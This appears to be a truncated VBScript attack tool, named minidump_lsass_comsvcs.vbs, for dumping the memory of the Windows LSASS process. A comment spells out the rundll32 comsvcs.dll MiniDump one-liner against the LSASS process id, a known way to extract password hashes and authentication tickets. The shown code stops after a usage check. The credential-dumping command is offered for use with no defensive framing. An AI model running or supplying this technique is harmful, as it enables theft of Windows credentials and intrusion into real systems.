' vbs lsass minidump
' same as lolbin comsvcs with debug privilege :
' rundll32 C:\windows\system32\comsvcs.dll MiniDump "[pid-lsass] lsass.dmp full"
...
If (WScript.Arguments.Count <> 1) Then
    WScript.StdOut.WriteLine("Usage: cscript minidump_lsass_comsvcs.vbs lsass.exe")
    WScript.Quit
Else
